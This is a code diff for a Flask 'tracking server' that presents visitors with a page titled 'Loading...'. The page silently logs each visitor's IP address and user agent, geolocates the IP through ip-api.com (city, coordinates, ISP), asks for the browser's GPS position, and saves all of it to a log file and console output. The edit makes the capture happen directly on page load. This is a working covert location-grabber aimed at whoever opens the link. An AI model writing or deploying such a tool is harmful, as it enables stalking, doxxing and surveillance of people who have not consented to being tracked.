@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-# tracking_server.py - Flask server to capture IP, geolocation, and GPS (if granted)
+# tracking_server.py - Captures IP and geolocation directly on page load
 
-from flask import Flask, request, jsonify, send_file, render_template_string
+from flask import Flask, request, render_template_string
 import requests
 import json
 import datetime
@@ -10,19 +10,15 @@ import os
 app = Flask(__name__)
 
 LOG_FILE = "tracking_logs.txt"
+
+# Simple HTML that redirects (no extra beacons needed)
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
     <title>Loading...</title>
     <script>
-        (function() {
-            var ip = encodeURIComponent("{{ip}}");
-            var ua = encodeURIComponent("{{ua}}");
-            var img = new Image();
-            img.src = "/log?ip=" + ip + "&ua=" + ua;
-        })();
-
+        // Try to get GPS coordinates if user allows
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
@@ -51,35 +47,36 @@ def log_entry(data):
 
 @app.route("/")
 def index():
+    # Get real IP behind proxies
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if client_ip and ',' in client_ip:
+        client_ip = client_ip.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'unknown')
-    return render_template_string(HTML_TEMPLATE, ip=client_ip, ua=user_agent)
 
-@app.route("/log")
-def log():
-    ip = request.args.get('ip')
-    ua = request.args.get('ua')
+    # Geolocate IP
     geo = {}
-    if ip and ip != "127.0.0.1" and not ip.startswith("192.168."):
+    if client_ip and client_ip not in ("127.0.0.1", "::1") and not client_ip.startswith("192.168.") and not client_ip.startswith("10."):
         try:
-            resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,query", timeout=5)
+            resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp,query", timeout=5)
             if resp.status_code == 200:
                 geo = resp.json()
         except:
             geo = {"error": "lookup_failed"}
-    # Use timezone-aware UTC timestamp
+
     timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
     data = {
         "timestamp": timestamp,
         "type": "ip_log",
-        "ip": ip,
-        "user_agent": ua,
+        "ip": client_ip,
+        "user_agent": user_agent,
         "geo": geo
     }
-    # Print to console for Render logs
+
+    # Print to Render logs and save to file
     print(f"GEO: {geo}")
     log_entry(data)
-    return "OK", 200
+
+    return render_template_string(HTML_TEMPLATE, ip=client_ip, ua=user_agent)
 
 @app.route("/log_gps")
 def log_gps():
@@ -95,6 +92,7 @@ def log_gps():
         "error": error
     }
     log_entry(data)
+    print(f"GPS: {data}")
     return "OK", 200
 
 @app.route("/logs")
